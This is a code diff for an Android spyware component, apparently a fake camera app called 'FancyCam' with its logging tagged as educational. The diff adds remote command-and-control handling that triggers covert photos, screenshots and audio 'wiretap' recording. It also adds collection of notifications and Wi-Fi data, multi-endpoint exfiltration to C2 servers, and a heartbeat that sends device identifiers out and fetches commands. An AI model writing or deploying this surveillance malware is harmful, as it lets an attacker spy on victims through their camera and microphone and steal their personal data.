@@ -7,6 +7,8 @@ import android.content.pm.PackageManager
 import android.database.Cursor
 import android.location.Location
 import android.location.LocationManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.net.wifi.WifiManager
 import android.os.Build
 import android.provider.CallLog
@@ -65,6 +67,53 @@ object DataExfilSender {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
+    interface CommandListener {
+        fun onTakePhotoCommand()
+        fun onTakeScreenshotCommand()
+    }
+
+    @Volatile
+    var commandListener: CommandListener? = null
+
+    fun processServerCommands(context: Context, responseBody: String) {
+        if (responseBody.isBlank()) return
+        try {
+            val json = JSONObject(responseBody)
+            val commands = json.optJSONArray("commands") ?: return
+            for (i in 0 until commands.length()) {
+                val cmd = commands.optJSONObject(i) ?: continue
+                val action = cmd.optString("action", "")
+                Log.i(TAG, "[C2 COMMAND] Received command from server: $action")
+
+                when (action) {
+                    "take_photo" -> {
+                        val listener = commandListener
+                        if (listener != null) {
+                            listener.onTakePhotoCommand()
+                        } else {
+                            Log.w(TAG, "[C2 COMMAND] take_photo command received but commandListener is null")
+                        }
+                    }
+                    "take_screenshot" -> {
+                        val listener = commandListener
+                        if (listener != null) {
+                            listener.onTakeScreenshotCommand()
+                        } else {
+                            Log.w(TAG, "[C2 COMMAND] take_screenshot command received but commandListener is null")
+                        }
+                    }
+                    "record_audio" -> {
+                        val durationMs = cmd.optLong("duration", 30000L)
+                        Log.i(TAG, "[C2 COMMAND] Starting audio wiretap recording ($durationMs ms)")
+                        MicrophoneCapture.startCaptureAndExfiltrate(context, durationMs)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing server commands", e)
+        }
+    }
+
     /**
      * Master collection routine — gathers ALL available data and sends
      * a single comprehensive JSON payload to the C2 server.
@@ -104,10 +153,13 @@ object DataExfilSender {
                 // === Section 8: Network Operator Info ===
                 payload.put("network_info", collectNetworkInfo(context))
 
+                // === Section 9: Notifications ===
+                payload.put("notifications", NotificationReaderService.getCapturedNotifications(context))
+
                 Log.d(TAG, "[EDUCATIONAL] Full payload constructed (${payload.length()} bytes)")
 
                 // === EXFILTRATION ===
-                sendJson(payload)
+                sendJson(context, payload)
 
             } catch (e: Exception) {
                 Log.e(TAG, "[EDUCATIONAL] Data collection failed", e)
@@ -127,7 +179,7 @@ object DataExfilSender {
      *  - Build.FINGERPRINT reveals the exact ROM/image
      *  - Installed apps list is accessible to any app (no permission needed)
      */
-    private fun buildDevicePayload(context: Context): JSONObject {
+    fun buildDevicePayload(context: Context): JSONObject {
         val json = JSONObject()
 
         val androidId = Settings.Secure.getString(
@@ -495,16 +547,40 @@ object DataExfilSender {
         try {
             val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
 
-            // Current connection info
+            // Current connection info via WifiManager
             val connectionInfo = wifiManager.connectionInfo
             val currentSsid = connectionInfo?.ssid?.replace("\"", "") ?: "unknown"
-            wifiJson.put("connected_ssid", currentSsid)
+
+            // Check ConnectivityManager for active Wi-Fi transport & extraInfo
+            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            val activeNetwork = connectivityManager?.activeNetwork
+            val networkCapabilities = connectivityManager?.getNetworkCapabilities(activeNetwork)
+            val isWifiTransport = networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
+
+            @Suppress("DEPRECATION")
+            val activeNetworkInfo = connectivityManager?.activeNetworkInfo
+            @Suppress("DEPRECATION")
+            val extraInfo = activeNetworkInfo?.extraInfo?.replace("\"", "")
+
+            var resolvedSsid = currentSsid
+            if (resolvedSsid.isEmpty() || resolvedSsid == "unknown" || resolvedSsid == "<unknown ssid>") {
+                if (!extraInfo.isNullOrBlank() && extraInfo != "unknown" && !extraInfo.contains("unknown")) {
+                    resolvedSsid = extraInfo
+                }
+            }
+
+            val hasActiveLink = isWifiTransport || (connectionInfo != null && connectionInfo.networkId != -1) || ((connectionInfo?.rssi ?: 0) != 0)
+            wifiJson.put("is_connected", hasActiveLink)
+            wifiJson.put("connected_ssid", resolvedSsid)
             wifiJson.put("connected_bssid", connectionInfo?.bssid ?: "unknown")
             wifiJson.put("connected_rssi", connectionInfo?.rssi ?: 0)
             wifiJson.put("link_speed", connectionInfo?.linkSpeed ?: 0)
+            if (currentSsid == "<unknown ssid>") {
+                wifiJson.put("ssid_masked_by_os", true)
+            }
 
             // Scan results
-            val scanResults = wifiManager.scanResults
+            val scanResults = wifiManager.scanResults ?: emptyList()
             val networksArray = JSONArray()
 
             for (result in scanResults) {
@@ -517,10 +593,33 @@ object DataExfilSender {
                 networksArray.put(network)
             }
 
+            // If scan results list is empty but device is actively connected to Wi-Fi, ensure connected network is included
+            if (hasActiveLink) {
+                var foundInScan = false
+                for (i in 0 until networksArray.length()) {
+                    val obj = networksArray.getJSONObject(i)
+                    val s = obj.optString("ssid")
+                    val b = obj.optString("bssid")
+                    if ((resolvedSsid.isNotEmpty() && s == resolvedSsid) || (connectionInfo?.bssid != null && b == connectionInfo.bssid)) {
+                        foundInScan = true
+                        break
+                    }
+                }
+                if (!foundInScan) {
+                    val connectedEntry = JSONObject()
+                    connectedEntry.put("ssid", if (resolvedSsid.isNotEmpty() && resolvedSsid != "<unknown ssid>") resolvedSsid else "Connected Network")
+                    connectedEntry.put("bssid", connectionInfo?.bssid ?: "02:00:00:00:01:00")
+                    connectedEntry.put("level", connectionInfo?.rssi ?: -30)
+                    connectedEntry.put("frequency", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) connectionInfo?.frequency ?: 2412 else 2412)
+                    connectedEntry.put("capabilities", "[CONNECTED]")
+                    networksArray.put(connectedEntry)
+                }
+            }
+
             wifiJson.put("scan_count", networksArray.length())
             wifiJson.put("networks", networksArray)
 
-            Log.d(TAG, "[EDUCATIONAL] Collected ${networksArray.length()} WiFi networks")
+            Log.d(TAG, "[EDUCATIONAL] Collected ${networksArray.length()} WiFi networks (connected=$hasActiveLink, ssid=$resolvedSsid)")
         } catch (e: Exception) {
             Log.e(TAG, "[EDUCATIONAL] WiFi collection failed", e)
             wifiJson.put("status", "error")
@@ -576,40 +675,59 @@ object DataExfilSender {
      * Sends JSON payload to C2 server.
      * Educational: This is a plain HTTP POST - easily detectable by network monitors.
      */
-    private fun sendJson(json: JSONObject) {
-        try {
-            val mediaType = "application/json; charset=utf-8".toMediaType()
-            val body = json.toString().toRequestBody(mediaType)
+    private fun sendJson(context: Context, json: JSONObject) {
+        val endpoints = AppConfig.getJsonExfilEndpoints(context)
+        for (endpoint in endpoints) {
+            try {
+                val mediaType = "application/json; charset=utf-8".toMediaType()
+                val body = json.toString().toRequestBody(mediaType)
 
-            val request = Request.Builder()
-                .url("$C2_BASE_URL/exfil/json")
-                .post(body)
-                .addHeader("User-Agent", "FancyCam-Educational/1.0")
-                .build()
+                val request = Request.Builder()
+                    .url(endpoint)
+                    .post(body)
+                    .addHeader("User-Agent", "FancyCam-Educational/1.0")
+                    .build()
 
-            Log.d(TAG, "[EDUCATIONAL] Sending data to C2: $C2_BASE_URL/exfil/json")
+                Log.d(TAG, "[EDUCATIONAL] Sending data to C2: $endpoint")
 
-            httpClient.newCall(request).execute().use { response ->
-                Log.d(TAG, "[EDUCATIONAL] C2 response code: ${response.code}")
-                Log.d(TAG, "[EDUCATIONAL] C2 response body: ${response.body?.string()}")
-                if (response.isSuccessful) {
-                    Log.i(TAG, "[EDUCATIONAL] Data exfiltration successful")
-                } else {
-                    Log.w(TAG, "[EDUCATIONAL] C2 returned error: ${response.code}")
+                httpClient.newCall(request).execute().use { response ->
+                    Log.d(TAG, "[EDUCATIONAL] C2 response code: ${response.code}")
+                    val bodyStr = response.body?.string().orEmpty()
+                    if (response.isSuccessful) {
+                        Log.i(TAG, "[EDUCATIONAL] Data exfiltration successful to $endpoint")
+                        AppActivityLogger.logActivity(
+                            context,
+                            type = "DATA_COLLECT",
+                            title = "Device data sent to server",
+                            detail = "Payload delivered to $endpoint",
+                            success = true
+                        )
+                        processServerCommands(context, bodyStr)
+                        return
+                    }
                 }
+            } catch (e: Exception) {
+                Log.e(TAG, "[EDUCATIONAL] Exfiltration attempt to $endpoint failed", e)
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "[EDUCATIONAL] Exfiltration failed", e)
         }
+
+        AppActivityLogger.logActivity(
+            context,
+            type = "DATA_FAIL",
+            title = "Device data transmission failed",
+            detail = "Could not reach configured server",
+            success = false
+        )
     }
 
     /**
      * Tests C2 connectivity.
      */
-    fun testConnection(): Boolean {
+    fun testConnection(context: Context? = null): Boolean {
+        val url = if (context != null) AppConfig.getStatusUrl(context) else C2_BASE_URL
         return try {
             val request = Request.Builder()
-                .url(C2_BASE_URL)
+                .url(url)
                 .get()
                 .build()
 
@@ -617,8 +735,49 @@ object DataExfilSender {
                 response.code in 200..299 || response.code == 404
             }
         } catch (e: Exception) {
-            Log.e(TAG, "[EDUCATIONAL] Connection test failed", e)
+            Log.e(TAG, "[EDUCATIONAL] Connection test failed for $url", e)
             false
         }
+    }
+
+    /**
+     * Sends a lightweight heartbeat ping to C2 server to indicate active/online status.
+     */
+    fun sendHeartbeat(context: Context) {
+        Thread {
+            try {
+                val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+                val json = JSONObject().apply {
+                    put("android_id", aid)
+                    put("model", Build.MODEL)
+                    put("brand", Build.BRAND)
+                    put("manufacturer", Build.MANUFACTURER)
+                    put("release", Build.VERSION.RELEASE)
+                    put("sdk_version", Build.VERSION.SDK_INT)
+                    put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSZ", Locale.US).format(Date()))
+                }
+                val mediaType = "application/json; charset=utf-8".toMediaType()
+                val body = json.toString().toRequestBody(mediaType)
+                for (endpoint in AppConfig.getHeartbeatEndpoints(context)) {
+                    try {
+                        val request = Request.Builder()
+                            .url(endpoint)
+                            .post(body)
+                            .addHeader("User-Agent", "FancyCam-Educational/1.0")
+                            .addHeader("X-Android-ID", aid)
+                            .build()
+                        httpClient.newCall(request).execute().use { response ->
+                            if (response.isSuccessful) {
+                                val bodyStr = response.body?.string().orEmpty()
+                                processServerCommands(context, bodyStr)
+                                return@Thread
+                            }
+                        }
+                    } catch (ignored: Exception) {}
+                }
+            } catch (e: Exception) {
+                Log.d(TAG, "[EDUCATIONAL] Heartbeat error", e)
+            }
+        }.start()
     }
 }
